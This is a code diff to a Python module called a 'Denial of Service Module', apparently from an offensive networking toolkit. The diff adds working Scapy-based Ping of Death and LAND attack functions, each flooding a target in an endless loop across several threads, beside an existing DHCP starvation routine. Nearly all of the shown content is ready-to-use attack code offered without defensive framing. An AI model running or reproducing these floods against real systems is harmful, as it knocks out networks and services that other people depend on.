@@ -29,7 +29,7 @@ class Jam(object):
 
 	name = "Denial of Service Module."
 	desc = "Denial of service attacks here."
-	version = "1.0"
+	version = "1.1"
 	ps = "Need to add POST DoS attack."
 
 	def __init__(self):
@@ -199,6 +199,52 @@ class Jam(object):
 			print "[!] Error: {}".format(e)
 
 
+
+	def pingofdeath(self):
+		try:
+			pkt = fragment(IP(dst=self.tgt)/ICMP()/("X"*60000))
+			send(pkt, loop=1, inter=0.0, verbose=False)
+			print "[-] Ping Of Death finalized."
+			exit(0)
+		except Exception as e:
+			pass
+
+	def pingofdeathstart(self,target):
+		self.tgt = target
+		try:
+			print "[+] Ping of Death denial of service initialized."
+			for x in range(0,3):
+				i = threading.Thread(name='pingofdeath', target=self.pingofdeath)
+				i.setDaemon(True)
+				i.start()
+			self.pingofdeath()
+		except Exception as e:
+			print "[!] Exception caught: {}".format(e)
+
+
+	def landstart(self,target,port):
+		self.tgt = target
+		self.port = port
+		try:
+			print "[+] LAND attack denial of service initialized."
+			for x in range(0,3):
+				i = threading.Thread(name='land', target=self.land)
+				i.setDaemon(True)
+				i.start()
+			self.land()
+		except Exception as e:
+			print "[!] Exception caught: {}".format(e)
+
+	def land(self):
+		try:
+			pkt = IP(src=self.tgt,dst=self.tgt)/TCP(sport=self.port)
+			send(pkt, loop=1, inter=0.0, verbose=False)
+			print "[-] LAND attack finalized."
+			exit(0)
+		except Exception as e:
+			print "[!] Error: {}".format(e)
+
+
         def dhcpstarvationstart(self):
                 try:
                         print "[+] DHCP starvation denial of service initialized."
@@ -221,3 +267,5 @@ class Jam(object):
 			exit(0)
 		except Exception as e:
 			pass
+
+
